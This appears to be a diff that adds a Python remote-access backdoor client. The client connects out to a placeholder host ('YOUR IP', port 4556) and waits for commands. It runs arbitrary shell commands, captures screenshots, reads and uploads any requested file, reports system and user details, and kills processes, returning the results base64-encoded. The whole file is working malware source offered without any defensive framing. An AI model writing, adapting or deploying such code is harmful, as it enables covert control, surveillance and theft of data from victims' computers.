@@ -1,0 +1,66 @@
+import platform              
+import subprocess                   
+from socket import *
+from PIL import ImageGrab 
+from base64 import b64encode
+from subprocess import check_output
+from os import chdir, getcwd, getlogin, remove
+HOST    = "YOUR IP"                    
+PORT    = 4556
+
+if __name__ == '__main__':                         
+    Client  = socket(AF_INET,SOCK_STREAM)                           
+    
+    Client.connect((HOST, PORT))            
+
+    while True:                                                     
+        RawDate    = str(Client.recv(1024), 'utf-8')                
+        Date       = RawDate.split(" ")                            
+        Result     = "Çıktı: Bilinmeyen Komut!"                
+        MOD        = False                                          
+    
+
+        if Date[0] == "cmd":                                    
+            output = check_output(Date[1], shell="True")         
+            Result = str(output, 'utf-8')                                                  
+    
+        elif Date[0] == "chdir":                                    
+            if Date[1] == "back":                                  
+                chdir('..')                                         
+                Result = "Back"                                 
+            elif Date[1] == "path":
+                Result = getcwd()                                   
+            elif Date[1] == "chdir":                               
+                chdir(Date[2])                                      
+                Result = "Chdir"                                
+    
+        elif Date[0] == "showScreen" or Date[0] == "showscreen":                                       
+            Img  = ImageGrab.grab()                                         
+            Img.save("TMP.png")                                             
+            with open("TMP.png", "rb") as file: output = file.read()        
+            remove("TMP.png")                                               
+            Result = b64encode(bytes(output))                               
+            MOD = True                                                      
+
+        elif Date[0] == "sysinfo":                                                                           
+            Result = f"OS: {platform.platform()}\nProcessor: {platform.machine()}\nDomain: {getlogin()}"      
+
+        elif Date[0] == "file":                                                                               
+            with open(str(Date[2]), "rb") as File:FileDate = File.read()                                      
+            Result = b64encode(FileDate)                                                                      
+            MOD = True                           
+        elif Date[0] == 'stop':
+            if Date[1].isdigit():
+                stop = subprocess.call(["taskkill", "/F", "/PID", Date[1]])
+            else:
+                stop = subprocess.call(["taskkill", "/F", "/IM", Date[1]])
+            output_sub = check_output(stop, shell="True")         
+            Result = str(output_sub, 'utf-8')
+            Client.send(bytes(Result))                                                          
+
+        elif Date[0] == "quit":quit()                                                                        
+    
+        if MOD == True: Client.send(bytes(Result))                                                            
+        elif MOD == False: Client.send(bytes(Result, 'utf-8'))                                                
+    
+    Client.close()                                                                                            
